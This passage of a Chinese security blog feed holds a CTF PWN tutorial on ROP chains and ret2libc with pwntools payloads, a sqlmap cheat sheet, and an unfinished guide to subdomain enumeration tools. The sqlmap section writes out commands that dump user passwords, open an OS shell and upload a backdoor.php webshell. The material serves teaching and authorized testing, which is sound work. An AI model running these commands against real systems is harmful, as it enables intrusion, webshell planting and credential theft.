count);</code></strong></p><ul><li><code>fd</code>：文件描述符（如 <code>0</code> 表示标准输入）。</li><li><code>buf</code>：写入数据的目标地址（如栈、堆或 BSS 段）。</li><li><code>count</code>：读取字节数，可用于触发溢出或布置 ROP 链。</li></ul></li><li><p><strong><code>int puts(const char *s);</code></strong></p><ul><li><code>s</code>：字符串起始地址，遇 <code>\x00</code> 终止。</li><li>常用于泄露 GOT 表中的函数地址（如 <code>puts(puts_got)</code>）。</li></ul></li><li><p><strong><code>int printf(const char *format, ...);</code></strong></p><ul><li><code>format</code>：格式化字符串。</li><li>可利用格式化字符串漏洞泄露任意地址内容。</li></ul></li></ol><h3 id="参数传递方式对比"><a href="#参数传递方式对比" class="headerlink" title="参数传递方式对比"></a>参数传递方式对比</h3><table><thead><tr><th>架构</th><th>参数传递方式</th></tr></thead><tbody><tr><td><strong>32 位 (x86)</strong></td><td>所有参数通过栈从右向左压入</td></tr><tr><td><strong>64 位 (x86_64)</strong></td><td>前 6 个参数通过寄存器传递：<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code></td></tr></tbody></table><p><strong>提示</strong>：在 64 位 ROP 构造中，常用 gadget 包括：</p><ul><li><code>pop rdi; ret</code></li><li><code>pop rsi; pop r15; ret</code></li><li><code>pop rdx; ret</code></li></ul><h3 id="系统调用号（syscall）"><a href="#系统调用号（syscall）" class="headerlink" title="系统调用号（syscall）"></a>系统调用号（syscall）</h3><p>系统调用号因架构不同而异，常用函数的调用号如下：</p><table><thead><tr><th>函数</th><th>x86 (32 位)</th><th>x86_64 (64 位)</th></tr></thead><tbody><tr><td><code>read</code></td><td>3</td><td>0</td></tr><tr><td><code>write</code></td><td>4</td><td>1</td></tr><tr><td><code>execve</code></td><td>11</td><td>59</td></tr></tbody></table><ul><li><strong>x86</strong>：使用 <code>int 0x80</code> 触发系统调用。</li><li><strong>x86_64</strong>：使用 <code>syscall</code> 指令，通过设置 <code>rax</code> 寄存器控制系统调用类型。</li></ul><h2 id="常见函数-ROP-构造"><a href="#常见函数-ROP-构造" class="headerlink" title="常见函数 ROP 构造"></a>常见函数 ROP 构造</h2><p>以下展示如何针对常用函数构造 ROP 链，分别以 32 位和 64 位架构为例。假设使用 <code>pwntools</code> 的 <code>flat</code> 函数来构造 payload。</p><h3 id="write-函数"><a href="#write-函数" class="headerlink" title="write 函数"></a>write 函数</h3><ul><li><strong>32 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span> * offset,  <span class="hljs-comment"># 填充至返回地址</span><br>    write_plt,      <span class="hljs-comment"># write 函数 PLT 地址</span><br>    main_addr,      <span class="hljs-comment"># 返回地址（通常回到 main）</span><br>    <span class="hljs-number">1</span>,              <span class="hljs-comment"># fd = stdout</span><br>    write_got,      <span class="hljs-comment"># buf = GOT 地址，用于泄露</span><br>    <span class="hljs-number">4</span>               <span class="hljs-comment"># count = 4 字节</span><br>)<br></code></pre></td></tr></table></figure><ul><li><strong>64 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    pop_rdi, <span class="hljs-number">1</span>,         <span class="hljs-comment"># RDI = 1 (stdout)</span><br>    pop_rsi_r15, write_got, <span class="hljs-number">0</span>,  <span class="hljs-comment"># RSI = GOT 地址</span><br>    pop_rdx, <span class="hljs-number">8</span>,         <span class="hljs-comment"># RDX = 8 字节</span><br>    write_plt           <span class="hljs-comment"># 调用 write</span><br>)<br></code></pre></td></tr></table></figure><h3 id="read-函数"><a href="#read-函数" class="headerlink" title="read 函数"></a>read 函数</h3><ul><li><strong>32 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span> * offset,  <span class="hljs-comment"># 填充至返回地址</span><br>    read_plt,       <span class="hljs-comment"># read 函数 PLT 地址</span><br>    ret_addr,       <span class="hljs-comment"># 返回地址</span><br>    <span class="hljs-number">0</span>,              <span class="hljs-comment"># fd = stdin</span><br>    buf_addr,       <span class="hljs-comment"># 目标地址（如 BSS 段）</span><br>    <span class="hljs-number">100</span>             <span class="hljs-comment"># count = 100 字节</span><br>)<br></code></pre></td></tr></table></figure><ul><li><strong>64 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    pop_rdi, <span class="hljs-number">0</span>,         <span class="hljs-comment"># RDI = 0 (stdin)</span><br>    pop_rsi_r15, buf_addr, <span class="hljs-number">0</span>,  <span class="hljs-comment"># RSI = 目标地址</span><br>    pop_rdx, <span class="hljs-number">100</span>,       <span class="hljs-comment"># RDX = 100 字节</span><br>    read_plt,           <span class="hljs-comment"># 调用 read</span><br>    main_addr           <span class="hljs-comment"># 返回 main</span><br>)<br></code></pre></td></tr></table></figure><h3 id="puts-函数"><a href="#puts-函数" class="headerlink" title="puts 函数"></a>puts 函数</h3><ul><li><strong>32 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span> * offset,  <span class="hljs-comment"># 填充至返回地址</span><br>    puts_plt,       <span class="hljs-comment"># puts 函数 PLT 地址</span><br>    main_addr,      <span class="hljs-comment"># 返回地址</span><br>    puts_got        <span class="hljs-comment"># 参数：puts GOT 地址</span><br>)<br></code></pre></td></tr></table></figure><ul><li><strong>64 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    pop_rdi, puts_got,  <span class="hljs-comment"># RDI = puts GOT 地址</span><br>    puts_plt,           <span class="hljs-comment"># 调用 puts</span><br>    main_addr           <span class="hljs-comment"># 返回 main</span><br>)<br></code></pre></td></tr></table></figure><h3 id="printf-函数（格式化字符串泄露）"><a href="#printf-函数（格式化字符串泄露）" class="headerlink" title="printf 函数（格式化字符串泄露）"></a>printf 函数（格式化字符串泄露）</h3><ul><li><strong>32 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span> * offset,  <span class="hljs-comment"># 填充至返回地址</span><br>    printf_plt,     <span class="hljs-comment"># printf 函数 PLT 地址</span><br>    main_addr,      <span class="hljs-comment"># 返回地址</span><br>    got_puts        <span class="hljs-comment"># 参数：格式化字符串（如 &quot;%s&quot;）</span><br>)<br></code></pre></td></tr></table></figure><ul><li><strong>64 位构造</strong>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat(<br>    pop_rdi, format_str,    <span class="hljs-comment"># RDI = 格式化字符串地址</span><br>    pop_rsi_r15, got_read, <span class="hljs-number">0</span>,  <span class="hljs-comment"># RSI = 目标地址</span><br>    printf_plt,             <span class="hljs-comment"># 调用 printf</span><br>    main_addr               <span class="hljs-comment"># 返回 main</span><br>)<br></code></pre></td></tr></table></figure><h2 id="ret2libc-利用流程"><a href="#ret2libc-利用流程" class="headerlink" title="ret2libc 利用流程"></a>ret2libc 利用流程</h2><p><code>ret2libc</code> 是一种经典的漏洞利用技术，绕过 NX 保护，通过调用 libc 中的函数（如 <code>system(&quot;/bin/sh&quot;)</code>）获取 shell。以下是常规流程：</p><ol><li><strong>泄露 GOT 表地址</strong>：利用 <code>puts</code> 或 <code>write</code> 泄露 <code>puts@got</code> 的真实地址。</li><li><strong>计算 libc 基址</strong>：通过接收到的地址，结合 libc 的偏移量，计算 libc 基址。</li><li><strong>获取关键函数地址</strong>：利用 libc 基址和偏移，得到 <code>system</code> 和 <code>&quot;/bin/sh&quot;</code> 字符串的地址。</li><li><strong>构造 ROP 链</strong>：调用 <code>system(&quot;/bin/sh&quot;)</code> 执行 shell。</li></ol><h2 id="ROP-汇总对比表"><a href="#ROP-汇总对比表" class="headerlink" title="ROP 汇总对比表"></a>ROP 汇总对比表</h2><table><thead><tr><th>函数</th><th>架构</th><th>参数方式</th><th>构造说明</th></tr></thead><tbody><tr><td>write</td><td>32 位</td><td>栈上传参</td><td><code>fd=1, buf=got, count=4</code></td></tr><tr><td>write</td><td>64 位</td><td>RDI, RSI, RDX</td><td>ROP 控制 3 个寄存器后调用</td></tr><tr><td>read</td><td>32 位</td><td>栈上传参</td><td>用于栈迁移或注入后续 ROP 链</td></tr><tr><td>read</td><td>64 位</td><td>RDI, RSI, RDX</td><td>常与 <code>leave_ret</code> gadget 搭配使用</td></tr><tr><td>puts</td><td>32 位</td><td>栈上传参</td><td>调用 <code>puts(got_xxx)</code> 泄露地址</td></tr><tr><td>puts</td><td>64 位</td><td>RDI -&gt; GOT 地址</td><td><code>pop rdi; call puts</code></td></tr><tr><td>printf</td><td>32 位</td><td>栈上传参</td><td><code>printf(fmt, val)</code> 用于格式化泄露</td></tr><tr><td>printf</td><td>64 位</td><td>RDI, RSI</td><td>RDI 指向格式化字符串，RSI 指向地址</td></tr></tbody></table><h2 id="实用工具提示"><a href="#实用工具提示" class="headerlink" title="实用工具提示"></a>实用工具提示</h2><ul><li><strong>ROPgadget</strong>：用于查找二进制文件中的 gadget，例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary a.out --only <span class="hljs-string">&#x27;pop|ret&#x27;</span><br></code></pre></td></tr></table></figure></li><li><strong>pwndbg</strong>：GDB 插件，方便调试和查找 gadget。</li><li><strong>pwntools</strong>：Python 库，简化 ROP 链构造和 payload 生成。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ELF 文件的保护机制和架构特性直接影响漏洞利用的难度和方式。理解 RELRO、Canary、NX 和 PIE 等保护机制的作用，以及如何通过 ROP 和 ret2libc 技术绕过这些保护，是 CTF 和二进制安全研究的核心技能。希望本文的分析和示例代码能为你的 PWN 学习提供帮助！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>ELF</tag>
      
      <tag>ROP</tag>
      
      <tag>CTF</tag>
      
      <tag>二进制安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLMap 自动化 SQL 注入工具</title>
    <link href="/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="SQLMap-自动化-SQL-注入工具"><a href="#SQLMap-自动化-SQL-注入工具" class="headerlink" title="SQLMap 自动化 SQL 注入工具"></a>SQLMap 自动化 SQL 注入工具</h2><h2 id="一、🔍-核心功能与命令选项"><a href="#一、🔍-核心功能与命令选项" class="headerlink" title="一、🔍 核心功能与命令选项"></a>一、🔍 核心功能与命令选项</h2><h3 id="（一）基础检测类-🧪"><a href="#（一）基础检测类-🧪" class="headerlink" title="（一）基础检测类 🧪"></a>（一）基础检测类 🧪</h3><table><thead><tr><th>任务分类</th><th>命令选项</th><th>说明</th><th>示例命令</th></tr></thead><tbody><tr><td>检测注入点</td><td><code>-u &lt;url&gt;</code></td><td>指定目标 URL</td><td><code>sqlmap -u &quot;http://x.com/index.php?id=1&quot; --batch</code></td></tr><tr><td>POST 请求注入</td><td><code>--data</code></td><td>提交 POST 数据</td><td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td></tr><tr><td>Cookie 注入</td><td><code>--cookie</code></td><td>携带 Cookie 信息</td><td><code>sqlmap -u &quot;http://x.com&quot; --cookie=&quot;PHPSESSID=123&quot;</code></td></tr><tr><td>强制 dbms</td><td><code>--dbms=&lt;类型&gt;</code></td><td>强制指定数据库类型</td><td><code>sqlmap -u &quot;...?id=1&quot; --dbms=mysql</code></td></tr><tr><td>绕过 WAF</td><td><code>--tamper=&lt;脚本&gt;</code></td><td>使用 Tamper 脚本</td><td><code>sqlmap -u &quot;...?id=1&quot; --tamper=charunicodeencode</code></td></tr></tbody></table><h3 id="（二）数据枚举类-📚"><a href="#（二）数据枚举类-📚" class="headerlink" title="（二）数据枚举类 📚"></a>（二）数据枚举类 📚</h3><table><thead><tr><th>任务分类</th><th>命令选项</th><th>说明</th><th>示例命令</th></tr></thead><tbody><tr><td>枚举所有数据库</td><td><code>--dbs</code></td><td>列出目标所有数据库</td><td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td></tr><tr><td>枚举指定数据库表</td><td><code>-D &lt;db&gt; --tables</code></td><td>列出指定数据库的表</td><td><code>sqlmap -u &quot;...?id=1&quot; -D mydb --tables</code></td></tr><tr><td>枚举字段</td><td><code>-D &lt;db&gt; -T &lt;table&gt; --columns</code></td><td>列出表字段</td><td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users --columns</code></td></tr><tr><td>导出字段数据</td><td><code>-D &lt;db&gt; -T &lt;table&gt; -C &lt;cols&gt; --dump</code></td><td>指定字段并导出</td><td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users -C username,password --dump</code></td></tr><tr><td>获取数据库用户</td><td><code>--users</code></td><td>获取数据库用户信息</td><td><code>sqlmap -u &quot;...?id=1&quot; --users</code></td></tr></tbody></table><h3 id="（三）高级操作类-🛠️"><a href="#（三）高级操作类-🛠️" class="headerlink" title="（三）高级操作类 🛠️"></a>（三）高级操作类 🛠️</h3><table><thead><tr><th>任务分类</th><th>命令选项</th><th>说明</th><th>示例命令</th></tr></thead><tbody><tr><td>获取系统 Shell</td><td><code>--os-shell</code></td><td>打开 OS Shell（高权限需）</td><td><code>sqlmap -u &quot;...?id=1&quot; --os-shell</code></td></tr><tr><td>上传文件</td><td><code>--file-write/--file-dest</code></td><td>上传文件到目标服务器</td><td><code>sqlmap -u &quot;...?id=1&quot; --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php</code></td></tr><tr><td>权限提升</td><td><code>--priv-esc</code></td><td>数据库用户权限提升尝试</td><td><code>sqlmap -u &quot;...?id=1&quot; --priv-esc</code></td></tr><tr><td>执行系统命令</td><td><code>--os-cmd=&quot;&lt;命令&gt;&quot;</code></td><td>执行系统命令</td><td><code>sqlmap -u &quot;...?id=1&quot; --os-cmd=&quot;whoami&quot;</code></td></tr></tbody></table><h2 id="二、🎯-实用场景命令示例"><a href="#二、🎯-实用场景命令示例" class="headerlink" title="二、🎯 实用场景命令示例"></a>二、🎯 实用场景命令示例</h2><h3 id="✅-基础注入检测"><a href="#✅-基础注入检测" class="headerlink" title="✅ 基础注入检测"></a>✅ 基础注入检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本 GET 请求注入</span><br>sqlmap -u <span class="hljs-string">&quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</span> --batch<br><br><span class="hljs-comment"># POST 表单注入（如登录）</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/login.php&quot;</span> --data=<span class="hljs-string">&quot;username=admin&amp;password=admin&quot;</span><br></code></pre></td></tr></table></figure><h3 id="📚-数据枚举与导出"><a href="#📚-数据枚举与导出" class="headerlink" title="📚 数据枚举与导出"></a>📚 数据枚举与导出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># 枚举数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> --dbs<br><br><span class="hljs-comment"># 枚举指定数据库表</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb --tables<br><br><span class="hljs-comment"># 枚举表字段</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 导出字段数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class="hljs-built_in">users</span> -C username,password --dump<br></code></pre></td></tr></table></figure><h3 id="🧨-高级渗透操作"><a href="#🧨-高级渗透操作" class="headerlink" title="🧨 高级渗透操作"></a>🧨 高级渗透操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取 OS Shell</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> --os-shell<br><br><span class="hljs-comment"># 上传 WebShell</span><br>sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php<br></code></pre></td></tr></table></figure><h2 id="三、🎛️-关键参数与使用技巧"><a href="#三、🎛️-关键参数与使用技巧" class="headerlink" title="三、🎛️ 关键参数与使用技巧"></a>三、🎛️ 关键参数与使用技巧</h2><h3 id="📏-检测控制"><a href="#📏-检测控制" class="headerlink" title="📏 检测控制"></a>📏 检测控制</h3><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>--level=1~5</code></td><td>设置检测深度（默认 1），高等级检测更多参数</td></tr><tr><td><code>--risk=1~3</code></td><td>设置风险等级（默认 1），高等级尝试更危险 payload</td></tr><tr><td><code>--random-agent</code></td><td>使用随机 UA，减少被识别为工具概率</td></tr></tbody></table><h3 id="🧰-调试与代理支持"><a href="#🧰-调试与代理支持" class="headerlink" title="🧰 调试与代理支持"></a>🧰 调试与代理支持</h3><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td><code>--proxy=&quot;http://127.0.0.1:8080&quot;</code></td><td>配合 Burp 抓包调试</td></tr><tr><td><code>-v 0~6</code></td><td>日志输出详细程度（如 <code>-v 3</code> 显示 payload）</td></tr><tr><td><code>--flush-session</code></td><td>清除缓存，重新检测</td></tr></tbody></table><h3 id="🕳️-绕过防护技巧"><a href="#🕳️-绕过防护技巧" class="headerlink" title="🕳️ 绕过防护技巧"></a>🕳️ 绕过防护技巧</h3><table><thead><tr><th>脚本名</th><th>说明</th></tr></thead><tbody><tr><td><code>apostrophemask</code></td><td>编码单引号绕过</td></tr><tr><td><code>base64encode</code></td><td>对 Payload Base64 编码绕过</td></tr><tr><td><code>space2comment</code></td><td>使用注释代替空格（如：<code>SELECT/**/1</code>）</td></tr></tbody></table><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;...?id=1&quot;</span> --tamper=base64encode<br><span class="hljs-comment"># 多脚本组合</span><br>sqlmap -u <span class="hljs-string">&quot;...?id=1&quot;</span> --tamper=between,charunicodeencode<br></code></pre></td></tr></table></figure><h2 id="四、📌-常用命令速查表"><a href="#四、📌-常用命令速查表" class="headerlink" title="四、📌 常用命令速查表"></a>四、📌 常用命令速查表</h2><table><thead><tr><th>功能</th><th>示例命令</th></tr></thead><tbody><tr><td>基础检测</td><td><code>sqlmap -u &quot;http://x.com/?id=1&quot;</code></td></tr><tr><td>POST 注入</td><td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td></tr><tr><td>枚举数据库</td><td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td></tr><tr><td>枚举表与字段</td><td><code>-D mydb --tables</code>、<code>-T users --columns</code></td></tr><tr><td>导出数据</td><td><code>-D db -T table -C col1,col2 --dump</code></td></tr><tr><td>获取系统 Shell</td><td><code>--os-shell</code></td></tr><tr><td>绕过 WAF</td><td><code>--tamper=base64encode</code></td></tr></tbody></table><p>✅ <strong>总结与建议</strong></p><ul><li>🔐 切勿在未授权目标上使用 SQLMap！</li><li>🔄 推荐使用 <code>--batch</code> 避免交互中断，适合脚本化执行。</li><li>🧪 利用 <code>-r</code> 加载 Burp 捕获的请求文件，更真实模拟攻击场景。</li><li>📌 常用指令可整理成脚本，提升实战效率。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>sqlmap</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子域名枚举工具</title>
    <link href="/2025/07/21/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/07/21/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1️⃣-Subfinder"><a href="#1️⃣-Subfinder" class="headerlink" title="1️⃣ Subfinder"></a>1️⃣ Subfinder</h2><ul><li><strong>项目地址</strong>：<a href="https://github.com/projectdiscovery/subfinder">🔗 https://github.com/projectdiscovery/subfinder</a>  </li><li><strong>功能</strong>：快速、可靠的子域名枚举工具，集成多个被动数据源  </li><li><strong>语言</strong>：Go</li></ul><h3 id="✅-安装配置"><a href="#✅-安装配置" class="headerlink" title="✅ 安装配置"></a>✅ 安装配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 Go 语言环境</span><br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install golang-go -y<br><br><span class="hljs-comment"># 验证 Go 安装</span><br>go version<br><br><span class="hljs-comment"># 配置 Go 环境变量（按需）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export GOPATH=$HOME/go&#x27;</span> &gt;&gt; ~/.zshrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export PATH=$PATH:$GOPATH/bin&#x27;</span> &gt;&gt; ~/.zshrc<br><span class="hljs-built_in">source</span> ~/.zshrc<br><br><span class="hljs-comment"># 设置 Go 模块代理</span><br>go <span class="hljs-built_in">env</span> -w GOPROXY=https://goproxy.cn,direct<br><br><span class="hljs-comment"># 安装 Subfinder</span><br>go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest<br><br><span class="hljs-comment"># 验证安装</span><br>subfinder -version || <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -s <span class="hljs-variable">$HOME</span>/go/bin/subfinder /usr/local/bin/subfinder<br>​````<br><br><span class="hljs-comment">### 🛠 常见用法</span><br><br>​```bash<br><span class="hljs-comment"># 基本子域名枚举</span><br>subfinder -d example.com<br><br><span class="hljs-comment"># 输出到文件</span><br>subfinder -d example.com -o result.txt<br><br><span class="hljs-comment"># 使用配置文件（推荐设置 API）</span><br>subfinder -d example.com -pc subfinder-config.yaml<br><br><span class="hljs-comment"># 批量扫描多个域名</span><br>subfinder -dL domains.txt -oL output.txt<br><br><span class="hljs-comment"># 配合 httpx 探测活跃子域</span><br>subfinder -d example.com | httpx -silent<br></code></pre></td></tr></table></figure><hr><h2 id="2️⃣-Knock"><a href="#2️⃣-Knock" class="headerlink" title="2️⃣ Knock"></a>2️⃣ Knock</h2><ul><li><p><strong>项目地址</strong>：<a href="https://github.com/guelfoweb/knock">🔗 https://github.com/guelfoweb/knock</a></p></li><li><p><strong>功能</strong>：Python 编写的子域名爆破工具，使用字典枚举</p></li><li><p><strong>语言</strong>：Python</p></li><li><p><strong>特点</strong>：</p><ul><li>可自定义字典进行暴力枚举</li><li>支持 WHOIS 检测</li><li>脚本化扩展能力强</li></ul></li></ul><h3 id="✅-安装方式"><a href="#✅-安装方式" class="headerlink" title="✅ 安装方式"></a>✅ 安装方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/guelfoweb/knock.git<br><span class="hljs-built_in">cd</span> knock<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure><h3 id="🛠-常见用法"><a href="#🛠-常见用法" class="headerlink" title="🛠 常见用法"></a>🛠 常见用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用默认字典</span><br>python3 knockpy.py example.com<br><br><span class="hljs-comment"># 指定字典</span><br>python3 knockpy.py example.com -w /path/to/wordlist.txt<br><br><span class="hljs-comment"># 输出结果保存到目录</span><br>python3 knockpy.py example.com -o output_dir<br></code></pre></td></tr></table></figure><hr><h2 id="3️⃣-TheHarvester"><a href="#3️⃣-TheHarvester" class="headerlink" title="3️⃣ TheHarvester"></a>3️⃣ TheHarvester</h2><ul><li><p><strong>项目地址</strong>：<a href="https://github.com/laramies/theHarvester">🔗 https://github.com/laramies/theHarvester</a></p></li><li><p><strong>功能</strong>：信息收集利器，可用于枚举子域名、邮箱、员工、IP 等</p></li><li><p><strong>语言</strong>：Python</p></li><li><p><strong>特点</strong>：</p><ul><li>被动信息收集，支持多个搜索引擎</li><li>可收集邮箱&#x2F;IP 等社工信息</li><li>适合 APT 情报分析与前期侦察</li></ul></li></ul><h3 id="✅-安装方式（Kali-自带）"><a href="#✅-安装方式（Kali-自带）" class="headerlink" title="✅ 安装方式（Kali 自带）"></a>✅ 安装方式（Kali 自带）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/laramies/theHarvester.git<br><span class="hljs-built_in">cd</span> theHarvester<br>pip3 install -r requirements.txt<br>python3 theHarvester.py -h<br></code></pre></td></tr></table></figure><h3 id="🛠-常见用法-1"><a href="#🛠-常见用法-1" class="headerlink" title="🛠 常见用法"></a>🛠 常见用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 Baidu 枚举子域</span><br>python3 theHarvester.py -d example.com -b baidu<br><br><span class="hljs-comment"># 多个搜索引擎组合使用</span><br>python3 theHarvester.py -d example.com -b bing,crtsh<br><br><span class="hljs-comment"># 输出为 HTML 文件</span><br>python3 theHarvester.py -d example.com -b bing -f result<br><br><span class="hljs-comment"># 